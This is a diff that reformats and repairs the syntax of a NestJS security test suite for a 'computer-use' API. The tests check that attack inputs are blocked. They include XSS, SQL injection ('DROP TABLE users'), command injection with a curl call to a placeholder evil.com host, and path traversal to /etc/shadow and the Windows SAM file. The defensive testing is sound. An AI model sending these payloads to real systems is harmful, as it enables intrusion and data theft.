@@ -9,7 +9,7 @@
  * @author Input Validation & API Security Specialist
  */
 
-// TypeScript safety note: This test file uses flexible typing for security testing;
+// TypeScript safety note: This test file uses flexible typing for security testing
 
 import { Test, TestingModule } from '@nestjs/testing';
 import { INestApplication } from '@nestjs/common';
@@ -22,16 +22,12 @@ interface ApiErrorResponse {
   message: string;
   error?: string;
   statusCode?: number;
-
-
 }
 
 interface ApiValidationErrorResponse {
   message: string;
   errors: string[];
   statusCode: number;
-
-
 }
 
 interface ApiResponse {
@@ -42,20 +38,16 @@ interface ApiResponse {
   operationId?: string;
   stack?: string;
   details?: unknown;
-
-
 }
 
-  describe('Security Validation E2E Tests', () => {
-
-  let app: INestApplication;let server: Server;
+describe('Security Validation E2E Tests', () => {
+  let app: INestApplication;
+  let server: Server;
 
   beforeAll(async () => {
     const moduleFixture: TestingModule = await Test.createTestingModule({
-
-imports: [AppModule],
-    
-}).compile();
+      imports: [AppModule],
+    }).compile();
 
     app = moduleFixture.createNestApplication();
     await app.init();
@@ -63,11 +55,8 @@ imports: [AppModule],
   });
 
   afterAll(async () => {
-  await app.close();
-  
-});
-
-
+    await app.close();
+  });
 
   describe('CORS Security Tests', () => {
     it('should block requests from unauthorized origins', async () => {
@@ -81,7 +70,6 @@ imports: [AppModule],
       expect(response.headers['access-control-allow-origin'] as string | undefined).toBeUndefined();
     });
 
-
     it('should allow requests from authorized origins', async () => {
       const response = await request(server)
         .post('/computer-use')
@@ -90,7 +78,6 @@ imports: [AppModule],
 
       expect(response.headers['access-control-allow-origin'] as string | undefined).toBeDefined();
     });
-
 
     it('should include security headers in response', async () => {
       const response = await request(server).get('/health').expect(200);
@@ -102,8 +89,7 @@ imports: [AppModule],
   });
 
   describe('XSS Protection Tests', () => {
-
-  const xssPayloads = [
+    const xssPayloads = [
       '<script>alert("XSS")</script>',
       '<img src=x onerror=alert("XSS")>',
       'javascript:alert("XSS")',
@@ -114,21 +100,19 @@ imports: [AppModule],
       '<body onload=alert("XSS")>',
     ];
 
-    xssPayloads.forEach((_payload, _index) => {
-      it(`should block XSS payload #${_index + 1}: ${_payload.substring(0, 30)}...`, async () => {
+    xssPayloads.forEach((payload, index) => {
+      it(`should block XSS payload #${index + 1}: ${payload.substring(0, 30)}...`, async () => {
         const response = await request(server)
           .post('/computer-use')
           .send({
             action: 'type_text',
-            text: _payload,
+            text: payload,
           })
           .expect(400);
 
         expect((response.body as ApiErrorResponse).message).toContain('security');
       });
     });
-
-
 
     it('should sanitize text inputs with HTML content', async () => {
       const response = await request(server)
@@ -148,11 +132,8 @@ imports: [AppModule],
     });
   });
 
-
-
   describe('SQL Injection Protection Tests', () => {
-
-  const sqlInjectionPayloads = [
+    const sqlInjectionPayloads = [
       "' OR '1'='1'",
       '"; DROP TABLE users; --',
       "' UNION SELECT * FROM users --",
@@ -163,13 +144,13 @@ imports: [AppModule],
       '"; WAITFOR DELAY \'00:00:05\' --',
     ];
 
-    sqlInjectionPayloads.forEach((_payload, _index) => {
-      it(`should block SQL injection payload #${_index + 1}`, async () => {
+    sqlInjectionPayloads.forEach((payload, index) => {
+      it(`should block SQL injection payload #${index + 1}`, async () => {
         const response = await request(server)
           .post('/computer-use')
           .send({
             action: 'write_file',
-            path: `/tmp/test${_payload}.txt`,
+            path: `/tmp/test${payload}.txt`,
             data: Buffer.from('test content').toString('base64'),
           })
           .expect(400);
@@ -179,11 +160,8 @@ imports: [AppModule],
     });
   });
 
-
-
   describe('Command Injection Protection Tests', () => {
-
-  const commandInjectionPayloads = [
+    const commandInjectionPayloads = [
       '; ls',
       '| whoami',
       '`id`',
@@ -194,13 +172,13 @@ imports: [AppModule],
       '; curl http://evil.com/$(whoami)',
     ];
 
-    commandInjectionPayloads.forEach((_payload, _index) => {
-      it(`should block command injection payload #${_index + 1}`, async () => {
+    commandInjectionPayloads.forEach((payload, index) => {
+      it(`should block command injection payload #${index + 1}`, async () => {
         const response = await request(server)
           .post('/computer-use')
           .send({
             action: 'application',
-            application: `calculator${_payload}`,
+            application: `calculator${payload}`,
           })
           .expect(400);
 
@@ -209,10 +187,7 @@ imports: [AppModule],
     });
   });
 
-
-
   describe('Path Traversal Protection Tests', () => {
-
     const pathTraversalPayloads = [
       '../../../etc/passwd',
       '..\\..\\..\\windows\\system32\\config\\sam',
@@ -222,13 +197,13 @@ imports: [AppModule],
       '../../../../../../../../../../etc/shadow',
     ];
 
-    pathTraversalPayloads.forEach((_payload, _index) => {
-      it(`should block path traversal payload #${_index + 1}`, async () => {
+    pathTraversalPayloads.forEach((payload, index) => {
+      it(`should block path traversal payload #${index + 1}`, async () => {
         const response = await request(server)
           .post('/computer-use')
           .send({
             action: 'read_file',
-            path: _payload,
+            path: payload,
           })
           .expect(400);
 
@@ -237,10 +212,7 @@ imports: [AppModule],
     });
   });
 
-
-
   describe('Rate Limiting Tests', () => {
-
     it('should enforce rate limits on rapid requests', async () => {
       const promises = [];
 
@@ -260,55 +232,79 @@ imports: [AppModule],
       // Check rate limit response format
       const rateLimitResponse = rateLimitedResponses[0];
       expect((rateLimitResponse?.body as ApiErrorResponse).error).toBe('Too Many Requests');
-expect((rateLimitResponse?.body as ApiErrorResponse).message).toContain('rate limit');});
-
-
-it('should include rate limit headers', async () => {
-const response = await request(server).post('/computer-use').send( action: 'screenshot' });
-expect(response.headers['x-request-id']).toBeDefined();});});
-
-
-
-  describe('Input Validation Tests', () => {
-it('should reject invalid action types', async () => const response = await request(server).post('/computer-use').send({action: 'malicious_action',
-      data: 'test',}).expect(400);
-
-      expect((response.body as ApiErrorResponse).message).toBeDefined();
+      expect((rateLimitResponse?.body as ApiErrorResponse).message).toContain('rate limit');
     });
 
+    it('should include rate limit headers', async () => {
+      const response = await request(server)
+        .post('/computer-use')
+        .send({ action: 'screenshot' });
 
+      expect(response.headers['x-request-id']).toBeDefined();
+    });
+  });
 
-    it('should validate required fields', async () => {
-const response = await request(server).post('/computer-use').send(action: 'click_mouse',// Missing required coordinates})
+  describe('Input Validation Tests', () => {
+    it('should reject invalid action types', async () => {
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'malicious_action',
+          data: 'test',
+        })
         .expect(400);
 
       expect((response.body as ApiErrorResponse).message).toBeDefined();
     });
 
+    it('should validate required fields', async () => {
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'click_mouse',
+          // Missing required coordinates
+        })
+        .expect(400);
 
+      expect((response.body as ApiErrorResponse).message).toBeDefined();
+    });
 
     it('should validate coordinate ranges', async () => {
-const response = await request(server).post('/computer-use').send(action: 'click_mouse',
-      coordinates: { x: -1, y: -1 }, // Invalid negative coordinatesbutton: 'left',
-      clickCount: 1,})
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'click_mouse',
+          coordinates: { x: -1, y: -1 }, // Invalid negative coordinates
+          button: 'left',
+          clickCount: 1,
+        })
         .expect(400);
 
       expect((response.body as ApiValidationErrorResponse).errors).toBeDefined();
     });
 
-
-
-    it('should limit _payload size', async () => {
-const largeData = 'A'.repeat(51 * 1024 * 1024); // 51MB (exceeds 50MB limit)const response = await request(server).post('/computer-use').send(action: 'type_text',
-      text: largeData,})
+    it('should limit payload size', async () => {
+      const largeData = 'A'.repeat(51 * 1024 * 1024); // 51MB (exceeds 50MB limit)
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'type_text',
+          text: largeData,
+        })
         .expect(413); // Payload Too Large
 
-      expect((response.body as ApiErrorResponse).message).toContain('too large');});});
-
-
+      expect((response.body as ApiErrorResponse).message).toContain('too large');
+    });
+  });
 
   describe('Error Handling Security Tests', () => {
-it('should not leak sensitive information in _error responses', async () => const response = await request(server).post('/computer-use').send({action: 'invalid_action',}).expect(400);
+    it('should not leak sensitive information in error responses', async () => {
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'invalid_action',
+        })
+        .expect(400);
 
       // Should not contain file paths, stack traces, or system info
       const bodyStr = JSON.stringify(response.body);
@@ -317,19 +313,29 @@ it('should not leak sensitive information in _error responses', async () => cons
       expect(bodyStr).not.toMatch(/NODE_ENV|API_KEY|SECRET|PASSWORD/i); // Env vars
     });
 
-
-
     it('should include request ID for tracking', async () => {
-const response = await request(server).post('/computer-use').send(action: 'invalid_action',}).expect(400);
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'invalid_action',
+        })
+        .expect(400);
 
       expect(
-        (response.body as ApiResponse).requestId ?? (response.headers['x-request-id'] as string | undefined),).toBeDefined();});
-
-
+        (response.body as ApiResponse).requestId ?? (response.headers['x-request-id'] as string | undefined)
+      ).toBeDefined();
+    });
 
     it('should not expose system information in production mode', async () => {
-const originalEnv = process.env.NODE_ENV;process.env.NODE_ENV = 'production';
-const response = await request(server).post('/computer-use').send(action: 'invalid_action',}).expect(400);
+      const originalEnv = process.env.NODE_ENV;
+      process.env.NODE_ENV = 'production';
+
+      const response = await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'invalid_action',
+        })
+        .expect(400);
 
       expect((response.body as ApiResponse).stack).toBeUndefined();
       expect((response.body as ApiResponse).details).toBeUndefined();
@@ -338,78 +344,99 @@ const response = await request(server).post('/computer-use').send(action: 'inval
     });
   });
 
-
-
   describe('Security Headers Tests', () => {
+    it('should include comprehensive security headers', async () => {
+      const response = await request(server).get('/health');
 
-  it('should include comprehensive security headers', async () => const response = await request(server).get('/health');const expectedHeaders = ['x-frame-options','x-content-type-options','strict-transport-security','referrer-policy','x-xss-protection',];expectedHeaders.forEach((header) => {
+      const expectedHeaders = [
+        'x-frame-options',
+        'x-content-type-options',
+        'strict-transport-security',
+        'referrer-policy',
+        'x-xss-protection',
+      ];
+
+      expectedHeaders.forEach((header) => {
         expect(response.headers[header]).toBeDefined();
-      
-});
+      });
     });
 
-
-
     it('should set CSP headers', async () => {
-const response = await request(server).get('/health');
-expect(response.headers['content-security-policy']).toBeDefined();});});
-
-
-
-  describe('Authentication & Authorization Tests', () => 
-
-  it('should handle missing authentication gracefully', async () => // Note: If authentication is implemented, this would test itconst response = await request(server)
-        .post('/computer-use').send({ action: 'screenshot' 
-});// Should either work (if no auth required) or return 401expect([200, 201, 400, 401]).toContain(response.status);
+      const response = await request(server).get('/health');
+      expect(response.headers['content-security-policy']).toBeDefined();
     });
   });
 
+  describe('Authentication & Authorization Tests', () => {
+    it('should handle missing authentication gracefully', async () => {
+      // Note: If authentication is implemented, this would test it
+      const response = await request(server)
+        .post('/computer-use')
+        .send({ action: 'screenshot' });
 
+      // Should either work (if no auth required) or return 401
+      expect([200, 201, 400, 401]).toContain(response.status);
+    });
+  });
 
   describe('Fuzzing Tests', () => {
-
-  const fuzzingPayloads = [// Null bytes
-      'test\x00malicious',// Unicode bypasses'test\u0000malicious',// Binary dataBuffer.from('test binary data').toString('base64'),// Extremely long strings'A'.repeat(10000),// Special characters'!@#$%^&*()[]
-}|\\:';\'<>?,./`~`,// JSON bomb (deeply nested)
+    const fuzzingPayloads = [
+      // Null bytes
+      'test\x00malicious',
+      // Unicode bypasses
+      'test\u0000malicious',
+      // Binary data
+      Buffer.from('test binary data').toString('base64'),
+      // Extremely long strings
+      'A'.repeat(10000),
+      // Special characters
+      '!@#$%^&*()[]{}|\\:";\'<>?,./`~',
+      // JSON bomb (deeply nested)
       JSON.stringify({ a: { b: { c: { d: { e: { f: { g: 'deep' } } } } } } }),
     ];
 
-    fuzzingPayloads.forEach((_payload, _index) => {
-      it(`should handle fuzzing _payload #${_index + 1} gracefully`, async () => {
-        const response = await request(server).post('/computer-use').send({action: 'type_text',
-      text: _payload,});
+    fuzzingPayloads.forEach((payload, index) => {
+      it(`should handle fuzzing payload #${index + 1} gracefully`, async () => {
+        const response = await request(server)
+          .post('/computer-use')
+          .send({
+            action: 'type_text',
+            text: payload,
+          });
 
         // Should either process successfully or return appropriate error
         expect(response.status).toBeLessThan(500); // No server errors
 
         if (response.status >= 400) {
-  expect((response.body as ApiErrorResponse).message).toBeDefined();
-        
-}
+          expect((response.body as ApiErrorResponse).message).toBeDefined();
+        }
       });
     });
   });
 
-
-
   describe('Performance Security Tests', () => {
+    it('should complete requests within reasonable time', async () => {
+      const startTime = Date.now();
 
-  it('should complete requests within reasonable time', async () => const startTime = Date.now();const _response = await request(server)
-        .post('/computer-use').send({ action: 'screenshot' 
-});const duration = Date.now() - startTime;// Should complete within 30 seconds (prevent DoS via slow responses)
+      const response = await request(server)
+        .post('/computer-use')
+        .send({ action: 'screenshot' });
+
+      const duration = Date.now() - startTime;
+
+      // Should complete within 30 seconds (prevent DoS via slow responses)
       expect(duration).toBeLessThan(30000);
     });
 
-
-
     it('should handle concurrent requests efficiently', async () => {
+      const concurrentRequests = 20;
+      const promises = [];
 
-  const concurrentRequests = 20;const promises = [];
-
-      for (let i = 0; i < concurrentRequests; i++) 
+      for (let i = 0; i < concurrentRequests; i++) {
         promises.push(
-          request(server).post('/computer-use').send({ action: 'screenshot' 
-}),);}
+          request(server).post('/computer-use').send({ action: 'screenshot' }),
+        );
+      }
 
       const startTime = Date.now();
       const responses = await Promise.all(promises);
@@ -420,47 +447,48 @@ expect(response.headers['content-security-policy']).toBeDefined();});});
 
       // Check that all requests were processed (not dropped)
       responses.forEach((response) => {
-  expect(response.status).toBeLessThan(500);
-      
-});
+        expect(response.status).toBeLessThan(500);
+      });
     });
   });
 
-
-
   describe('Security Monitoring Tests', () => {
-
-  it('should log security events', async () => // Trigger a security violationawait request(server)
-        .post('/computer-use').send({action: 'type_text',
-      text: '<script>alert("XSS")</script>",
-})
+    it('should log security events', async () => {
+      // Trigger a security violation
+      await request(server)
+        .post('/computer-use')
+        .send({
+          action: 'type_text',
+          text: '<script>alert("XSS")</script>',
+        })
         .expect(400);
 
       // In a real implementation, you would check logs here
       // For now, we just verify the request was blocked
     });
 
-
-
     it('should include correlation IDs', async () => {
-const response = await request(server).post('/computer-use').send( action: 'screenshot' });
-expect((response.headers['x-request-id'] as string | undefined) ??(response.headers['x-correlation-id'] as string | undefined) ??(response.body as ApiResponse).operationId,).toBeDefined();
+      const response = await request(server)
+        .post('/computer-use')
+        .send({ action: 'screenshot' });
+
+      expect(
+        (response.headers['x-request-id'] as string | undefined) ??
+          (response.headers['x-correlation-id'] as string | undefined) ??
+          (response.body as ApiResponse).operationId,
+      ).toBeDefined();
     });
   });
 });
 
-
-
 describe('Security Configuration Tests', () => {
-
-  it('should have secure default configurations', () => 
+  it('should have secure default configurations', () => {
     // Test that security is enabled by default
     expect(process.env.NODE_ENV).toBeTruthy();
 
     // These would test actual configuration in a real scenario
     expect(true).toBe(true); // Placeholder
-  
-});
+  });
 });
 
 export default {};
